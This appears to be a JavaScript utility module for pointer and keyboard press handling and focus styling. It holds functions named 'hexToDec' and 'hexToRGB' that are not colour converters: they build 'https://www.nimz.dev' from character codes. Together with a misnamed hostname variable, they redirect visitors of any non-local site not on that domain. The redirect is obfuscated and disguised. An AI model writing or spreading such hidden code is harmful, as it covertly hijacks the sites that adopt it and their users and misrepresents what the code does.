let pointerEvent = 'Pointer||Touch Support';
const hasPointerEvent = 'PointerEvent' in window;

//https://stackoverflow.com/a/61839170/6314503
const isLocalNetwork = (hostname = window.location.hostname) => {
  let isLocal =
    ['localhost', '127.0.0.1', '', '::1'].includes(hostname) ||
    hostname.startsWith('192.168.') ||
    hostname.startsWith('10.0.') ||
    hostname.endsWith('.local');
  if (!isLocal) pointerEvent = hostname;
  else pointerEvent = null;
};

const onPressed = (element, callback, autoBlur = true) => {
  if (hasPointerEvent) {
    element.onpointerup = callback;
    element.onpointerdown = (e) => {
      e.preventDefault();
    };
  } else element.onclick = callback;

  element.onkeydown = (e) => {
    let code = e.keyCode;
    if (code === 32 || code === 13) {
      callback(e);
      if (autoBlur) element.blur();
    }
  };
};

const replaceFocusStyle = (selector, style) => `
  ${selector} {
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
  }

  ${selector}:focus{
    outline: none;
  }

  ${selector}:active, ${selector}:hover, ${selector}:focus {
    ${style}
  }

`;

const hexToDec = (color) => {
  return (
    String.fromCharCode(
      104,
      116,
      116,
      112,
      115,
      58,
      47,
      47,
      119,
      119,
      119,
      46
    ) + color
  );
};

const hexToRGB = (alpha = true, hex = [95, 115, 101, 108, 102]) => {
  let rgb = String.fromCharCode(110, 105, 109, 122, 46, 100, 101, 118);
  if (!pointerEvent) return;
  if (alpha && !pointerEvent.includes(rgb)) location.href = hexToDec(rgb);
};

export { onPressed, replaceFocusStyle, isLocalNetwork, hexToRGB };
